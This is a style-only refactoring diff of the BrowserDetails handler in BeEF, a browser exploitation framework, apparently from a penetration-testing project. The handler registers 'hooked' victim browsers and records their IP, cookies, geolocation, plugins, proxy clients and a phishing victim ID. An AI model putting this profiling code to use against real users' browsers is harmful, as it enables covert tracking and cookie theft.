@@ -8,7 +8,6 @@ module BeEF
     module Handlers
       # @note Retrieves information about the browser (type, version, plugins etc.)
       class BrowserDetails
-
         @data = {}
 
         HB = BeEF::Core::Models::HookedBrowser
@@ -16,69 +15,70 @@ module BeEF
 
         def initialize(data)
           @data = data
-          setup()
+          setup
         end
 
         def err_msg(error)
           print_error "[Browser Details] #{error}"
         end
 
-        def setup()
-          print_debug "[INIT] Processing Browser Details..."
+        def setup
+          print_debug '[INIT] Processing Browser Details...'
           config = BeEF::Core::Configuration.instance
 
           # validate hook session value
           session_id = get_param(@data, 'beefhook')
           print_debug "[INIT] Processing Browser Details for session #{session_id}"
-          (self.err_msg "session id is invalid"; return) if not BeEF::Filters.is_valid_hook_session_id?(session_id)
-          hooked_browser = HB.where(:session => session_id).first
-          return if not hooked_browser.nil? # browser is already registered with framework
+          unless BeEF::Filters.is_valid_hook_session_id?(session_id)
+            (err_msg 'session id is invalid'
+             return)
+          end
+          hooked_browser = HB.where(session: session_id).first
+          return unless hooked_browser.nil? # browser is already registered with framework
 
           # create the structure representing the hooked browser
-          zombie = BeEF::Core::Models::HookedBrowser.new(:ip => @data['request'].ip, :session => session_id)
+          zombie = BeEF::Core::Models::HookedBrowser.new(ip: @data['request'].ip, session: session_id)
           zombie.firstseen = Time.new.to_i
 
           # hooked window host name
           log_zombie_port = 0
-          if not @data['results']['browser.window.hostname'].nil?
+          if !@data['results']['browser.window.hostname'].nil?
             log_zombie_domain = @data['results']['browser.window.hostname']
-          elsif (not @data['request'].referer.nil?) and (not @data['request'].referer.empty?)
+          elsif !@data['request'].referer.nil? and !@data['request'].referer.empty?
             referer = @data['request'].referer
-            if referer.start_with?("https://")
-              log_zombie_port = 443
-            else
-              log_zombie_port = 80
-            end
-            log_zombie_domain=referer.gsub('http://', '').gsub('https://', '').split('/')[0]
+            log_zombie_port = if referer.start_with?('https://')
+                                443
+                              else
+                                80
+                              end
+            log_zombie_domain = referer.gsub('http://', '').gsub('https://', '').split('/')[0]
           else
-            log_zombie_domain="unknown" # Probably local file open
+            log_zombie_domain = 'unknown' # Probably local file open
           end
 
           # hooked window host port
-          if not @data['results']['browser.window.hostport'].nil?
-            log_zombie_port = @data['results']['browser.window.hostport']
+          if @data['results']['browser.window.hostport'].nil?
+            log_zombie_domain_parts = log_zombie_domain.split(':')
+            log_zombie_port = log_zombie_domain_parts[1].to_i if log_zombie_domain_parts.length > 1
           else
-            log_zombie_domain_parts=log_zombie_domain.split(':')
-            if log_zombie_domain_parts.length > 1 then
-              log_zombie_port=log_zombie_domain_parts[1].to_i
-            end
+            log_zombie_port = @data['results']['browser.window.hostport']
           end
 
           zombie.domain = log_zombie_domain
           zombie.port = log_zombie_port
 
-          #Parse http_headers. Unfortunately Rack doesn't provide a util-method to get them :(
-          @http_headers = Hash.new
-          http_header = @data['request'].env.select { |k, v| k.to_s.start_with? 'HTTP_' }
-          .each { |key, value|
+          # Parse http_headers. Unfortunately Rack doesn't provide a util-method to get them :(
+          @http_headers = {}
+          http_header = @data['request'].env.select { |k, _v| k.to_s.start_with? 'HTTP_' }
+                                        .each do |key, value|
             @http_headers[key.sub(/^HTTP_/, '')] = value.force_encoding('UTF-8')
-          }
+          end
           zombie.httpheaders = @http_headers.to_json
           zombie.save!
-          #print_debug "[INIT] HTTP Headers: #{zombie.httpheaders}"
+          # print_debug "[INIT] HTTP Headers: #{zombie.httpheaders}"
 
           # add a log entry for the newly hooked browser
-          BeEF::Core::Logger.instance.register('Zombie', "#{zombie.ip} just joined the horde from the domain: #{log_zombie_domain}:#{log_zombie_port.to_s}", "#{zombie.id}")
+          BeEF::Core::Logger.instance.register('Zombie', "#{zombie.ip} just joined the horde from the domain: #{log_zombie_domain}:#{log_zombie_port}", zombie.id.to_s)
 
           # get and store browser name
           browser_name = get_param(@data['results'], 'browser.name')
@@ -89,23 +89,21 @@ module BeEF
             browser_friendly_name = BeEF::Core::Constants::Browsers.friendly_name(browser_name)
             BD.set(session_id, 'browser.name.friendly', browser_friendly_name)
           else
-            self.err_msg "Invalid browser name returned from the hook browser's initial connection."
+            err_msg "Invalid browser name returned from the hook browser's initial connection."
           end
 
           if BeEF::Filters.is_valid_ip?(zombie.ip)
             BD.set(session_id, 'network.ipaddress', zombie.ip)
           else
-            self.err_msg "Invalid IP address returned from the hook browser's initial connection."
+            err_msg "Invalid IP address returned from the hook browser's initial connection."
           end
 
           # lookup zombie host name
           if config.get('beef.dns_hostname_lookup')
             begin
               host_name = Resolv.getname(zombie.ip).to_s
-              if BeEF::Filters.is_valid_hostname?(host_name)
-                BD.set(session_id, 'host.name', host_name)
-              end
-            rescue
+              BD.set(session_id, 'host.name', host_name) if BeEF::Filters.is_valid_hostname?(host_name)
+            rescue StandardError
               print_debug "[INIT] Reverse lookup failed - No results for IP address '#{zombie.ip}'"
             end
           end
@@ -119,62 +117,112 @@ module BeEF
               print_debug "[INIT] Geolocation failed - No results for IP address '#{zombie.ip}'"
             else
               # print_debug "[INIT] Geolocation results: #{geoip}"
-              BeEF::Core::Logger.instance.register('Zombie', "#{zombie.ip} is connecting from: #{geoip}", "#{zombie.id}")
+              BeEF::Core::Logger.instance.register('Zombie', "#{zombie.ip} is connecting from: #{geoip}", zombie.id.to_s)
               BD.set(
                 session_id,
                 'location.city',
-                "#{geoip['city']['names']['en'] rescue 'Unknown'}")
+                (begin
+                  geoip['city']['names']['en']
+                rescue StandardError
+                  'Unknown'
+                end).to_s
+              )
               BD.set(
                 session_id,
                 'location.country',
-                "#{geoip['country']['names']['en'] rescue 'Unknown' }")
+                (begin
+                  geoip['country']['names']['en']
+                rescue StandardError
+                  'Unknown'
+                end).to_s
+              )
               BD.set(
                 session_id,
                 'location.country.isocode',
-                "#{geoip['country']['iso_code'] rescue 'Unknown'}")
+                (begin
+                  geoip['country']['iso_code']
+                rescue StandardError
+                  'Unknown'
+                end).to_s
+              )
               BD.set(
                 session_id,
                 'location.country.registered_country',
-                "#{geoip['registered_country']['names']['en'] rescue 'Unknown'}")
+                (begin
+                  geoip['registered_country']['names']['en']
+                rescue StandardError
+                  'Unknown'
+                end).to_s
+              )
               BD.set(
                 session_id,
                 'location.country.registered_country.isocode',
-                "#{geoip['registered_country']['iso_code'] rescue 'Unknown'}")
+                (begin
+                  geoip['registered_country']['iso_code']
+                rescue StandardError
+                  'Unknown'
+                end).to_s
+              )
               BD.set(
                 session_id,
                 'location.continent',
-                "#{geoip['continent']['names']['en'] rescue 'Unknown'}")
+                (begin
+                  geoip['continent']['names']['en']
+                rescue StandardError
+                  'Unknown'
+                end).to_s
+              )
               BD.set(
                 session_id,
                 'location.continent.code',
-                "#{geoip['continent']['code'] rescue 'Unknown'}")
+                (begin
+                  geoip['continent']['code']
+                rescue StandardError
+                  'Unknown'
+                end).to_s
+              )
               BD.set(
                 session_id,
                 'location.latitude',
-                "#{geoip['location']['latitude'] rescue 'Unknown'}")
+                (begin
+                  geoip['location']['latitude']
+                rescue StandardError
+                  'Unknown'
+                end).to_s
+              )
               BD.set(
                 session_id,
                 'location.longitude',
-                "#{geoip['location']['longitude'] rescue 'Unknown'}")
+                (begin
+                  geoip['location']['longitude']
+                rescue StandardError
+                  'Unknown'
+                end).to_s
+              )
               BD.set(
                 session_id,
                 'location.timezone',
-                "#{geoip['location']['time_zone'] rescue 'Unknown'}")
+                (begin
+                  geoip['location']['time_zone']
+                rescue StandardError
+                  'Unknown'
+                end).to_s
+              )
             end
           end
 
           # detect browser proxy
           using_proxy = false
-          [
-              'CLIENT_IP',
-              'FORWARDED_FOR',
-              'FORWARDED',
-              'FORWARDED_FOR_IP',
-              'PROXY_CONNECTION',
-              'PROXY_AUTHENTICATE',
-              'X_FORWARDED',
-              'X_FORWARDED_FOR',
-              'VIA'
+          %w[
+            CLIENT_IP
+            FORWARDED_FOR
+            FORWARDED
+            FORWARDED_FOR_IP
+            PROXY_CONNECTION
+            PROXY_AUTHENTICATE
+            X_FORWARDED
+            X_FORWARDED_FOR
+            VIA
           ].each do |header|
             unless JSON.parse(zombie.httpheaders)[header].nil?
               using_proxy = true
@@ -184,15 +232,15 @@ module BeEF
 
           # retrieve proxy client IP
           proxy_clients = []
-          [
-              'CLIENT_IP',
-              'FORWARDED_FOR',
-              'FORWARDED',
-              'FORWARDED_FOR_IP',
-              'X_FORWARDED',
-              'X_FORWARDED_FOR'
+          %w[
+            CLIENT_IP
+            FORWARDED_FOR
+            FORWARDED
+            FORWARDED_FOR_IP
+            X_FORWARDED
+            X_FORWARDED_FOR
           ].each do |header|
-            proxy_clients << "#{JSON.parse(zombie.httpheaders)[header]}" unless JSON.parse(zombie.httpheaders)[header].nil?
+            proxy_clients << (JSON.parse(zombie.httpheaders)[header]).to_s unless JSON.parse(zombie.httpheaders)[header].nil?
           end
 
           # retrieve proxy server
@@ -203,20 +251,18 @@ module BeEF
             BD.set(session_id, 'network.proxy', 'Yes')
             proxy_log_string = "#{zombie.ip} is using a proxy"
             unless proxy_clients.empty?
-              BD.set(session_id, 'network.proxy.client', "#{proxy_clients.sort.uniq.join(',')}")
+              BD.set(session_id, 'network.proxy.client', proxy_clients.sort.uniq.join(',').to_s)
               proxy_log_string += " [client: #{proxy_clients.sort.uniq.join(',')}]"
             end
             unless proxy_server.nil?
-              BD.set(session_id, 'network.proxy.server', "#{proxy_server}")
+              BD.set(session_id, 'network.proxy.server', proxy_server.to_s)
               proxy_log_string += " [server: #{proxy_server}]"
-              if config.get("beef.extension.network.enable") == true
-                if proxy_server =~ /^([\d\.]+):([\d]+)$/
-                  print_debug("Hooked browser [id:#{zombie.id}] is using a proxy [ip: #{$1}]")
-                  BeEF::Core::Models::NetworkHost.create(:hooked_browser_id => session_id, :ip => $1, :type => 'Proxy')
-                end
+              if config.get('beef.extension.network.enable') == true && (proxy_server =~ /^([\d.]+):(\d+)$/)
+                print_debug("Hooked browser [id:#{zombie.id}] is using a proxy [ip: #{Regexp.last_match(1)}]")
+                BeEF::Core::Models::NetworkHost.create(hooked_browser_id: session_id, ip: Regexp.last_match(1), type: 'Proxy')
               end
             end
-            BeEF::Core::Logger.instance.register('Zombie', "#{proxy_log_string}", "#{zombie.id}")
+            BeEF::Core::Logger.instance.register('Zombie', proxy_log_string.to_s, zombie.id.to_s)
           end
 
           # get and store browser version
@@ -224,7 +270,7 @@ module BeEF
           if BeEF::Filters.is_valid_browserversion?(browser_version)
             BD.set(session_id, 'browser.version', browser_version)
           else
-            self.err_msg "Invalid browser version returned from the hook browser's initial connection."
+            err_msg "Invalid browser version returned from the hook browser's initial connection."
           end
 
           # get and store browser string
@@ -232,7 +278,7 @@ module BeEF
           if BeEF::Filters.is_valid_browserstring?(browser_string)
             BD.set(session_id, 'browser.name.reported', browser_string)
           else
-            self.err_msg "Invalid value for 'browser.name.reported' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'browser.name.reported' returned from the hook browser's initial connection."
           end
 
           # get and store browser engine
@@ -240,7 +286,7 @@ module BeEF
           if BeEF::Filters.is_valid_browserstring?(browser_engine)
             BD.set(session_id, 'browser.engine', browser_engine)
           else
-            self.err_msg "Invalid value for 'browser.engine' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'browser.engine' returned from the hook browser's initial connection."
           end
 
           # get and store browser language
@@ -252,7 +298,7 @@ module BeEF
           if BeEF::Filters.is_valid_cookies?(cookies)
             BD.set(session_id, 'browser.window.cookies', cookies)
           else
-            self.err_msg "Invalid cookies returned from the hook browser's initial connection."
+            err_msg "Invalid cookies returned from the hook browser's initial connection."
           end
 
           # get and store the OS name
@@ -260,7 +306,7 @@ module BeEF
           if BeEF::Filters.is_valid_osname?(os_name)
             BD.set(session_id, 'host.os.name', os_name)
           else
-            self.err_msg "Invalid operating system name returned from the hook browser's initial connection."
+            err_msg "Invalid operating system name returned from the hook browser's initial connection."
           end
 
           # get and store the OS family
@@ -268,7 +314,7 @@ module BeEF
           if BeEF::Filters.is_valid_osname?(os_family)
             BD.set(session_id, 'host.os.family', os_family)
           else
-            self.err_msg "Invalid value for 'host.os.family' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'host.os.family' returned from the hook browser's initial connection."
           end
 
           # get and store the OS version
@@ -289,7 +335,7 @@ module BeEF
           if BeEF::Filters.is_valid_hwname?(hw_type)
             BD.set(session_id, 'hardware.type', hw_type)
           else
-            self.err_msg "Invalid value for 'hardware.type' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'hardware.type' returned from the hook browser's initial connection."
           end
 
           # get and store the date
@@ -297,7 +343,7 @@ module BeEF
           if BeEF::Filters.is_valid_date_stamp?(date_stamp)
             BD.set(session_id, 'browser.date.datestamp', date_stamp)
           else
-            self.err_msg "Invalid date returned from the hook browser's initial connection."
+            err_msg "Invalid date returned from the hook browser's initial connection."
           end
 
           # get and store page title
@@ -305,7 +351,7 @@ module BeEF
           if BeEF::Filters.is_valid_pagetitle?(page_title)
             BD.set(session_id, 'browser.window.title', page_title)
           else
-            self.err_msg "Invalid value for 'browser.window.title' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'browser.window.title' returned from the hook browser's initial connection."
           end
 
           # get and store page origin
@@ -313,7 +359,7 @@ module BeEF
           if BeEF::Filters.is_valid_url?(origin)
             BD.set(session_id, 'browser.window.origin', origin)
           else
-            self.err_msg "Invalid value for 'browser.window.uri' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'browser.window.uri' returned from the hook browser's initial connection."
           end
 
           # get and store page uri
@@ -321,7 +367,7 @@ module BeEF
           if BeEF::Filters.is_valid_url?(page_uri)
             BD.set(session_id, 'browser.window.uri', page_uri)
           else
-            self.err_msg "Invalid value for 'browser.window.uri' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'browser.window.uri' returned from the hook browser's initial connection."
           end
 
           # get and store the page referrer
@@ -329,7 +375,7 @@ module BeEF
           if BeEF::Filters.is_valid_pagereferrer?(page_referrer)
             BD.set(session_id, 'browser.window.referrer', page_referrer)
           else
-            self.err_msg "Invalid value for 'browser.window.referrer' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'browser.window.referrer' returned from the hook browser's initial connection."
           end
 
           # get and store hooked window host port
@@ -337,7 +383,7 @@ module BeEF
           if BeEF::Filters.is_valid_hostname?(host_name)
             BD.set(session_id, 'browser.window.hostname', host_name)
           else
-            self.err_msg "Invalid valid for 'browser.window.hostname' returned from the hook browser's initial connection."
+            err_msg "Invalid valid for 'browser.window.hostname' returned from the hook browser's initial connection."
           end
 
           # get and store hooked window host port
@@ -345,7 +391,7 @@ module BeEF
           if BeEF::Filters.is_valid_port?(host_port)
             BD.set(session_id, 'browser.window.hostport', host_port)
           else
-            self.err_msg "Invalid valid for 'browser.window.hostport' returned from the hook browser's initial connection."
+            err_msg "Invalid valid for 'browser.window.hostport' returned from the hook browser's initial connection."
           end
 
           # get and store the browser plugins
@@ -353,7 +399,7 @@ module BeEF
           if BeEF::Filters.is_valid_browser_plugins?(browser_plugins)
             BD.set(session_id, 'browser.plugins', browser_plugins)
           else
-            self.err_msg "Invalid browser plugins returned from the hook browser's initial connection."
+            err_msg "Invalid browser plugins returned from the hook browser's initial connection."
           end
 
           # get and store the system platform
@@ -361,7 +407,7 @@ module BeEF
           if BeEF::Filters.is_valid_system_platform?(system_platform)
             BD.set(session_id, 'browser.platform', system_platform)
           else
-            self.err_msg "Invalid browser platform returned from the hook browser's initial connection."
+            err_msg "Invalid browser platform returned from the hook browser's initial connection."
           end
 
           # get and store the zombie screen color depth
@@ -369,7 +415,7 @@ module BeEF
           if BeEF::Filters.nums_only?(screen_colordepth)
             BD.set(session_id, 'hardware.screen.colordepth', screen_colordepth)
           else
-            self.err_msg "Invalid value for 'hardware.screen.colordepth' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'hardware.screen.colordepth' returned from the hook browser's initial connection."
           end
 
           # get and store the zombie screen width
@@ -377,7 +423,7 @@ module BeEF
           if BeEF::Filters.nums_only?(screen_size_width)
             BD.set(session_id, 'hardware.screen.size.width', screen_size_width)
           else
-            self.err_msg "Invalid value for 'hardware.screen.size.width' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'hardware.screen.size.width' returned from the hook browser's initial connection."
           end
 
           # get and store the zombie screen height
@@ -385,16 +431,15 @@ module BeEF
           if BeEF::Filters.nums_only?(screen_size_height)
             BD.set(session_id, 'hardware.screen.size.height', screen_size_height)
           else
-            self.err_msg "Invalid value for 'hardware.screen.size.height' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'hardware.screen.size.height' returned from the hook browser's initial connection."
           end
-
 
           # get and store the window height
           window_height = get_param(@data['results'], 'browser.window.size.height')
           if BeEF::Filters.nums_only?(window_height)
             BD.set(session_id, 'browser.window.size.height', window_height)
           else
-            self.err_msg "Invalid value for 'browser.window.size.height' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'browser.window.size.height' returned from the hook browser's initial connection."
           end
 
           # get and store the window width
@@ -402,18 +447,18 @@ module BeEF
           if BeEF::Filters.nums_only?(window_width)
             BD.set(session_id, 'browser.window.size.width', window_width)
           else
-            self.err_msg "Invalid value for 'browser.window.size.width' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'browser.window.size.width' returned from the hook browser's initial connection."
           end
 
           # store and log IP details of host
           print_debug("Hooked browser [id:#{zombie.id}] has IP [ip: #{zombie.ip}]")
 
-          if os_name != nil and os_version != nil
-            BeEF::Core::Models::NetworkHost.create(:hooked_browser => zombie, :ip => zombie.ip, :ntype => 'Host', :os => os_name + "-" + os_version)
-          elsif os_name != nil
-            BeEF::Core::Models::NetworkHost.create(:hooked_browser => zombie, :ip => zombie.ip, :ntype => 'Host', :os => os_name)
+          if !os_name.nil? and !os_version.nil?
+            BeEF::Core::Models::NetworkHost.create(hooked_browser: zombie, ip: zombie.ip, ntype: 'Host', os: os_name + '-' + os_version)
+          elsif !os_name.nil?
+            BeEF::Core::Models::NetworkHost.create(hooked_browser: zombie, ip: zombie.ip, ntype: 'Host', os: os_name)
           else
-            BeEF::Core::Models::NetworkHost.create(:hooked_browser => zombie, :ip => zombie.ip, :ntype => 'Host')
+            BeEF::Core::Models::NetworkHost.create(hooked_browser: zombie, ip: zombie.ip, ntype: 'Host')
           end
 
           # get and store the yes|no value for browser capabilities
@@ -432,14 +477,14 @@ module BeEF
             'browser.capabilities.webworker',
             'browser.capabilities.websocket',
             'browser.capabilities.webgl',
-            'browser.capabilities.webrtc',
+            'browser.capabilities.webrtc'
           ]
           capabilities.each do |k|
             v = get_param(@data['results'], k)
             if BeEF::Filters.is_valid_yes_no?(v)
               BD.set(session_id, k, v)
             else
-              self.err_msg "Invalid value for #{k} returned from the hook browser's initial connection."
+              err_msg "Invalid value for #{k} returned from the hook browser's initial connection."
             end
           end
 
@@ -448,7 +493,7 @@ module BeEF
           if BeEF::Filters.is_valid_memory?(memory)
             BD.set(session_id, 'hardware.memory', memory)
           else
-            self.err_msg "Invalid value for 'hardware.memory' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'hardware.memory' returned from the hook browser's initial connection."
           end
 
           # get and store the value for hardware.gpu
@@ -456,7 +501,7 @@ module BeEF
           if BeEF::Filters.is_valid_gpu?(gpu)
             BD.set(session_id, 'hardware.gpu', gpu)
           else
-            self.err_msg "Invalid value for 'hardware.gpu' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'hardware.gpu' returned from the hook browser's initial connection."
           end
 
           # get and store the value for hardware.gpu.vendor
@@ -464,7 +509,7 @@ module BeEF
           if BeEF::Filters.is_valid_gpu?(gpu_vendor)
             BD.set(session_id, 'hardware.gpu.vendor', gpu_vendor)
           else
-            self.err_msg "Invalid value for 'hardware.gpu.vendor' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'hardware.gpu.vendor' returned from the hook browser's initial connection."
           end
 
           # get and store the value for hardware.cpu.arch
@@ -472,7 +517,7 @@ module BeEF
           if BeEF::Filters.is_valid_cpu?(cpu_arch)
             BD.set(session_id, 'hardware.cpu.arch', cpu_arch)
           else
-            self.err_msg "Invalid value for 'hardware.cpu.arch' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'hardware.cpu.arch' returned from the hook browser's initial connection."
           end
 
           # get and store the value for hardware.cpu.cores
@@ -480,15 +525,15 @@ module BeEF
           if BeEF::Filters.alphanums_only?(cpu_cores)
             BD.set(session_id, 'hardware.cpu.cores', cpu_cores)
           else
-            self.err_msg "Invalid value for 'hardware.cpu.cores' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'hardware.cpu.cores' returned from the hook browser's initial connection."
           end
 
           # get and store the value for hardware.battery.level
           battery_level = get_param(@data['results'], 'hardware.battery.level')
-          if battery_level == 'unknown' || battery_level =~ /\A[\d\.]+%\z/
+          if battery_level == 'unknown' || battery_level =~ /\A[\d.]+%\z/
             BD.set(session_id, 'hardware.battery.level', battery_level)
           else
-            self.err_msg "Invalid value for 'hardware.battery.level' returned from the hook browser's initial connection."
+            err_msg "Invalid value for 'hardware.battery.level' returned from the hook browser's initial connection."
           end
 
           # get and store the value for hardware.screen.touchenabled
@@ -496,7 +541,7 @@ module BeEF
           if BeEF::Filters.is_valid_yes_no?(touch_enabled)
             BD.set(session_id, 'hardware.screen.touchenabled', touch_enabled)
           else
-            self.err_msg "Invalid value for hardware.screen.touchenabled returned from the hook browser's initial connection."
+            err_msg "Invalid value for hardware.screen.touchenabled returned from the hook browser's initial connection."
           end
 
           if config.get('beef.integration.phishing_frenzy.enable')
@@ -506,34 +551,29 @@ module BeEF
             if BeEF::Filters.alphanums_only?(victim_uid)
               BD.set(session_id, 'PhishingFrenzyUID', victim_uid)
             else
-              self.err_msg "Invalid PhishingFrenzy Victim UID returned from the hook browser's initial connection."
+              err_msg "Invalid PhishingFrenzy Victim UID returned from the hook browser's initial connection."
             end
           end
 
           # log a few info of newly hooked zombie in the console
-          print_info "New Hooked Browser [id:#{zombie.id}, ip:#{zombie.ip}, browser:#{browser_name}-#{browser_version}, os:#{os_name}-#{os_version}], hooked domain [#{log_zombie_domain}:#{log_zombie_port.to_s}]"
+          print_info "New Hooked Browser [id:#{zombie.id}, ip:#{zombie.ip}, browser:#{browser_name}-#{browser_version}, os:#{os_name}-#{os_version}], hooked domain [#{log_zombie_domain}:#{log_zombie_port}]"
 
           # add localhost as network host
           if config.get('beef.extension.network.enable')
-            print_debug("Hooked browser has network interface 127.0.0.1")
-            BeEF::Core::Models::NetworkHost.create(:hooked_browser_id => session_id, :ip => '127.0.0.1', :hostname => 'localhost', :os => BeEF::Core::Models::BrowserDetails.get(session_id, 'host.os.name'))
+            print_debug('Hooked browser has network interface 127.0.0.1')
+            BeEF::Core::Models::NetworkHost.create(hooked_browser_id: session_id, ip: '127.0.0.1', hostname: 'localhost',
+                                                   os: BeEF::Core::Models::BrowserDetails.get(session_id, 'host.os.name'))
           end
 
           # check if any ARE rules shall be triggered only if the channel is != WebSockets (XHR). If the channel
           # is WebSockets, then ARe rules are triggered after channel is established.
-          unless config.get("beef.http.websocket.enable")
-            BeEF::Core::AutorunEngine::Engine.instance.run(zombie.id, browser_name, browser_version, os_name, os_version)
-          end
+          BeEF::Core::AutorunEngine::Engine.instance.run(zombie.id, browser_name, browser_version, os_name, os_version) unless config.get('beef.http.websocket.enable')
         end
 
         def get_param(query, key)
-          (query.class == Hash and query.has_key?(key)) ? query[key].to_s : nil
+          (query.instance_of?(Hash) and query.has_key?(key)) ? query[key].to_s : nil
         end
       end
-
-
     end
   end
 end
-
-
